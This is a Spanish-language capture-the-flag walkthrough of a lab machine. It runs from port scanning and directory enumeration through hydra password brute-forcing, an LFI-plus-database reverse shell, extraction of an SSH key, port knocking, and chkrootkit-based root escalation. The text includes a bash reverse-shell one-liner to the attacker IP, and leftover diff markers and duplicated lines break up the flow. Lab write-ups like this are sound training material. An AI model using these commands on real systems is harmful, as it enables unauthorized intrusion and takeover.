
### Enumeración y escaneo

Hacemos un escaneo de puertos y vemos que el puerto 80 y 443 están abiertos, con lo que comprobaremos que hay en ellas.
```bash

sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.23.159

Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-23 17:45 +0200

Nmap scan report for 10.129.23.159

Host is up (0.067s latency).

Not shown: 65533 filtered tcp ports (no-response)

PORT STATE SERVICE

80/tcp open http

443/tcp open https

```



![HTTP](/img/Pasted%20image%2020260423174644.png)

![HTTPS](/img/Pasted%20image%2020260423174757.png) 

```bash
gobuster dir --url http://10.129.23.159/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt
```
![](/img/Pasted%20image%2020260423175008.png) 

```bash
gobuster dir --url http://10.129.23.159/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-tls-validation 

```

![](/img/Pasted%20image%2020260423182707.png)

  

![](Pasted%20image%2020260423182723.png)
![](/img/Pasted%20image%2020260423182723.png)
#### Enumeración HTTPS 

```bash 
gobuster dir --url https://10.129.23.159/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt --no-tls-validation
```

![](Pasted%20image%2020260423175642.png) 
![](/img/Pasted%20image%2020260423175642.png) 


![](Pasted%20image%2020260423175747.png) 
![](/img/Pasted%20image%2020260423175747.png) 

## Explotación
### HTTPS
@ -54,34 +54,34 @@ Ya que es un simple login con solo el input de la contraseña le haremos fuerza
hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64 -V
```

![](Pasted%20image%2020260423180737.png)
![](/img/Pasted%20image%2020260423180737.png)


![](Pasted%20image%2020260423181116.png)
![](/img/Pasted%20image%2020260423181116.png)

Investigamos y vemos que tiene varios exploits, procederé a usar este https://www.exploit-db.com/exploits/24044

![](Pasted%20image%2020260423175849.png) 
![](/img/Pasted%20image%2020260423175849.png) 

Para el exploit debemos renonmbrar la base de datos, en mi caso la llamaré ninevehNotes.php
![](Pasted%20image%2020260423190525.png)
![](/img/Pasted%20image%2020260423190525.png)

Una vez creado debemos hacer una tabla nueva 
Una vez creado debemos hacer una tabla nueva y añadirle la reverse shell

![](Pasted%20image%2020260423181506.png)
![](/img/Pasted%20image%2020260423181506.png)


![](Pasted%20image%2020260423190633.png)
![](/img/Pasted%20image%2020260423190633.png)


Vemos que la base de datos está en el directorio /var/tmp
![](Pasted%20image%2020260423190525.png) 
Vemos que la base de datos está en el directorio /var/tmp en Rename Database
![](/img/Pasted%20image%2020260423190525.png) 

### HTTP
Mediante una pequeña trampa podemos saber que el usuario que acepta te indica si es válido o no 
![](Pasted%20image%2020260423182953.png) 
![](/img/Pasted%20image%2020260423182953.png) 

![](Pasted%20image%2020260423183028.png) 
![](/img/Pasted%20image%2020260423183028.png) 

Así que haciendo fuerza bruta al login intentaremos averiguar la contraseña.
```bash
@ -89,60 +89,60 @@ hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  http-post-form
``` 


![](Pasted%20image%2020260423183147.png) 
![](/img/Pasted%20image%2020260423183147.png) 

Una vez dentro buscaremos posibles vectores de ataque
![](Pasted%20image%2020260423183250.png) 
![](/img/Pasted%20image%2020260423183250.png) 

Al darle al apartado de Notas veremos que tenemos una vulnerabilidad de LFI la cuál explotaremos para escuchar el payload previamente creado en la base de datos

![](Pasted%20image%2020260423183352.png) 
![](/img/Pasted%20image%2020260423183352.png) 


Ya que sabíamos previamente donde está la base de datos porque lo habíamos visto procederemos ponerlo.  Y probamos el exploit y veremos que correctamente nos ha funcionado. Ahora procederemos a conseguir una reverse shell en nuestro sistema.
 ![](Pasted%20image%2020260423190738.png)
 ![](/img/Pasted%20image%2020260423190738.png)

Pillamos la petición mediante burpsuite y cambiamos el método de esta a POST
![](Pasted%20image%2020260423191114.png) 
![](/img/Pasted%20image%2020260423191114.png) 

Y lo cambiamos para tener iniciar la reverse shell, enviamos y esperamos. 

![](Pasted%20image%2020260423191403.png) 
![](/img/Pasted%20image%2020260423191403.png) 

Habremos entrado al sistema exitosamente

![](Pasted%20image%2020260423191513.png) 
![](/img/Pasted%20image%2020260423191513.png) 

Investigamos las carpetas y entramos a ssl 

![](Pasted%20image%2020260423191742.png)
![](/img/Pasted%20image%2020260423191742.png)

Entramos a secure_notes y vemos un png en el cual hacemos el comando strings, lo cuál nos muestra una private key de ssh del usuario amorois. 

![](Pasted%20image%2020260423192016.png)
![](/img/Pasted%20image%2020260423192016.png)

Sabemos que no tenía abierto ssh en el  escaneo previo así que investigo sus puertos abiertos y descubro que tiene un puerto 22 abierto
![](Pasted%20image%2020260423192233.png) 
![](/img/Pasted%20image%2020260423192233.png) 

Como no tiene ssh veremos los programas que tiene desde /etc/init.d y comprobamos que está usando knockd que es un programa que sirve para ocultar algún puerto para mayor seguridad.
![](Pasted%20image%2020260423192747.png) 
Como no tiene ssh veremos los programas que tiene desde /etc/init.d y comprobamos que está usando knockd que es un programa que sirve para ocultar puertos para mayor seguridad.
![](/img/Pasted%20image%2020260423192747.png) 

En el fichero propio de configuración podemos comprobar que tiene bloqueado el puerto 22, así que debemos jugar con la secuencia dada para abrir el puerto.
![](Pasted%20image%2020260423193024.png) 
![](/img/Pasted%20image%2020260423193024.png) 

Usaremos la propia herramienta y simplemente poniendo la secuencia podremos comprobar que se ha abierto el puerto 22 del ssh.
![](Pasted%20image%2020260423193434.png) 
Usaremos la herramienta knock y simplemente poniendo la secuencia podremos comprobar que se ha abierto el puerto 22 del ssh.
![](/img/Pasted%20image%2020260423193434.png) 


Así que ahora simplemente con la clave privada previamente copiada la usaremos para iniciar sesión en ssh con el usuario amrois

![](Pasted%20image%2020260423193647.png) 
![](/img/Pasted%20image%2020260423193647.png) 

Ya dentro podemos acceder a la primera flag de user.txt
![](/img/Pasted%20image%2020260423193958.png)
## Escalada de privilegios
Pasé el programa de pspy (https://github.com/dominicbreuker/pspy) para ver procesos que sean interesante y identifiqué que hay un proceso de chkrootkit el cuál tiene una vulnerabilidad explotable para escalar privilegios https://www.exploit-db.com/exploits/33899
![](Pasted%20image%2020260423200654.png)

Para ello debemos crear una reverseshell en /tmp que se llame update, este se ejecutara y seremos root exitosamente.
```bash
bash -i >& /dev/tcp/10.10.14.180/443 0>&1
```

Así dará por concluido el laboratorio con la última flag sacada

![](/img/Pasted%20image%2020260423200905.png)